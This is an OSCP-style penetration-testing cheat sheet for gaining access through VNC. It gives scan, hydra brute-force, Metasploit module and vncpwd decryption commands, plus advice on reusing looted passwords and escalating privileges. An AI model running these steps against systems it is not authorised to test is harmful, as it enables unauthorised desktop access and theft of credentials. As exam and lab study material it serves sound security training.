# 🔧 VNC — Ports 5900+ (5800 web)

> **Remote desktop (RFB protocol).** Display N → port 5900+N (5901 = :1…); 5800+ = optional Java/web viewer; RealVNC/TightVNC/UltraVNC variants. On OSCP, VNC is a **weak-password / no-auth GUI foothold**: the VNC password is **capped at 8 chars** and stored with a **fixed DES key** → both brute-forceable and decryptable; many instances have none at all. The desktop is often an **already-logged-in privileged user**. Stored VNC passwords elsewhere are trivially decryptable and reusable.

Related: [[Credential Attacks]] · [[Windows Privilege Escalation]] · [[Linux Privilege Escalation]] · [[Pivoting and Port Forwarding]]

---

## 🧠 PORT 5900 → THINK
- **Display N → port 5900+N** (5901 = :1, 5902 = :2 …). Scan the range.
- **No auth?** → connect straight to a desktop.
- **Weak 8-char password** → crack with `hydra`/Metasploit.
- Found a **VNC password file** (`~/.vnc/passwd`) → decrypt with `vncpwd` and reuse.
- Desktop often runs as a **logged-in/admin user** → immediate high-value access.

## ⚡ QUICK TRIAGE (60 sec)
```bash
export IP=10.10.10.10
```

```bash
nmap -p5900-5906 -sV --script vnc-info,realvnc-auth-bypass $IP
```

```bash
vncviewer $IP:5900         # try connecting (no auth?) — needs a GUI on Kali
```
**Verdict:** connects with no/weak auth → you have a desktop. Auth required → crack or find the stored password.

## ⏱️ ENUMERATE
```bash
nmap -p5900-5910 -sV --script vnc-info,vnc-title,realvnc-auth-bypass $IP
```

```bash
vncviewer $IP:5900         # or $IP:1 style (display number)
# Metasploit checks:
#   auxiliary/scanner/vnc/vnc_none_auth     -> no-auth instances
#   auxiliary/scanner/vnc/vnc_login         -> password brute
```

```bash
# Brute the (max 8-char) VNC password
hydra -P passwords.txt vnc://$IP
```

```bash
# Decrypt a recovered VNC password blob (fixed DES key)
vncpwd ~/.vnc/passwd            # or the 'vncpwd' tool on the recovered file
```
**Look for:** auth type (`None` = jackpot), VNC product/version, whether the display shows a logged-in session, a decryptable `passwd` file.

## 🗡️ EXPLOIT
- 🟢 **No-auth desktop access.**
- 🟢 **Weak-password brute (≤8 chars)** → desktop.
- 🟢 **Decrypt a stored VNC password** (`~/.vnc/passwd`, registry, config) → reuse.
- 🔵 **Version CVE** (e.g., RealVNC auth-bypass) — confirm exact product/version.

```bash
# No/weak auth -> desktop
vncviewer $IP:5900
```

```bash
# Brute then connect
hydra -P passwords.txt vnc://$IP
```

```bash
vncviewer $IP:5900          # enter cracked password
```

```bash
# Decrypt a looted password file
vncpwd passwd_file          # -> plaintext, then vncviewer
```
**After access:** open a terminal on the desktop → `whoami`/`id`, check privileges, loot files. If the session user is admin/root you may already be done; otherwise → [[Windows Privilege Escalation]] / [[Linux Privilege Escalation]]. Reuse the VNC password elsewhere ([[Credential Attacks]]).

## 🔁 FOUND → NEXT
| FINDING | MEANING | NEXT | RESULT |
|---|---|---|---|
| Auth = None | Open desktop | `vncviewer` | interactive access |
| VNC password prompt | Crackable | `hydra vnc://` | desktop |
| `~/.vnc/passwd` found | Recoverable | `vncpwd` decrypt | plaintext + reuse |
| Logged-in admin session | High priv | open terminal | near-privesc |
| RealVNC version X | Maybe CVE | verify + exploit | bypass |

## 🚧 FAILED → NEXT
| Problem | Do this |
|---|---|
| No GUI on Kali for vncviewer | Install `tigervnc-viewer`; or use Metasploit `vnc_login`/`vnc_none_auth` checks |
| Password won't brute | It's ≤8 chars — use a targeted list; check for a stored `passwd` file to decrypt instead |
| Wrong display/port | Enumerate 5900–5910; display :1 = 5901, etc. |
| Only reachable on localhost | Port-forward after a foothold ([[Pivoting and Port Forwarding]]) |
| Connect but black screen | Session locked — try version CVE or move on |

## 📋 REFERENCE — mistakes · don't-miss · stop
**Mistakes:** only checking **5900** (scan the whole 5900–591x range) · forgetting VNC passwords are **decryptable** (loot `~/.vnc/passwd`) · not **reusing** the VNC password on other services · overlooking that the desktop may already be a **privileged** session.
**Reuse:** VNC password (decrypted) → test on [[SSH]], [[SMB]], web, DBs; files on the desktop → more creds. See [[Credential Attacks]].
**Don't miss:** scan 5900–591x (display numbering) · check **no-auth** (`vnc_none_auth`) · brute ≤8-char password · decrypt any `~/.vnc/passwd` · reuse the VNC password · note product/version for CVE.
**Stop when:** no no-auth instance, password won't brute, and no stored blob to decrypt → move on; revisit with a looted `passwd` file or after a foothold (localhost). A desktop → work shifts to privesc.

## 📇 CHEAT SHEET
```bash
nmap -p5900-5910 -sV --script vnc-info,realvnc-auth-bypass $IP
```

```bash
vncviewer $IP:5900                     # no/weak auth
```

```bash
hydra -P passwords.txt vnc://$IP       # brute (<=8 chars)
```

```bash
vncpwd ~/.vnc/passwd                   # decrypt looted VNC password
# msf: auxiliary/scanner/vnc/vnc_none_auth , vnc_login
```
**Kill shots:** no-auth desktop · brute 8-char password · decrypt stored `passwd` → reuse.
